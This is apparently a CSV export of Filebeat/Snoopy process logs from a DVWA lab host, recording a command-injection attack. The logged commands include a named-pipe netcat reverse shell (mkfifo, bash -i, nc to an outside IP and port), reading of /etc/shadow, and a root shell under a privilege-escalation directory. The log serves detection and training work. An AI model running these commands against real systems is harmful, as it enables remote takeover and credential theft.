"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version",command,cwd,"ecs.version","event.dataset","event.ingested",filename,"host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,sid,tty,uid
"Oct 24, 2022 @ 23:21:10.554","_9aVCoQBDsc6tFfSXMqE",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",bash,"/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:11.556","/bin/bash","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,863","[uid:0 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/bash]: bash",238862,"(none)",0
"Oct 24, 2022 @ 23:19:26.542",Y9aTCoQBDsc6tFfSxrNE,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","cat /etc/shadow","/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:27.545","/bin/cat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,106","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/cat]: cat /etc/shadow",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",e9aTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","ping -c 4","/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.544","/bin/ping","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","640,289","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/ping]: ping -c 4",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",fNaTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","sleep 3","/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.544","/bin/sleep","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","640,389","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/sleep]: sleep 3",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",fdaTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","mkfifo /tmp/f","/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.544","/usr/bin/mkfifo","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","640,488","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/usr/bin/mkfifo]: mkfifo /tmp/f",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",ftaTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","cat /tmp/f","/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.544","/bin/cat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","640,598","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/cat]: cat /tmp/f",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",f9aTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","bash -i","/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.544","/bin/bash","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","640,698","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/bash]: bash -i",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",gNaTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","nc 123.123.123.250 9001","/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.544","/bin/nc","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","640,796","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/nc]: nc 123.123.123.250 9001",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",gdaTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",whoami,"/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.544","/usr/bin/whoami","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","640,908","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/usr/bin/whoami]: whoami",238862,"(none)",33
"Oct 24, 2022 @ 23:19:20.541",gtaTCoQBDsc6tFfSrrLW,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",id,"/var/www/html/vulnerabilities/exec","8.0.0",snoopy,"Oct 24, 2022 @ 23:19:21.545","/usr/bin/id","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,011","[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/usr/bin/id]: id",238862,"(none)",33
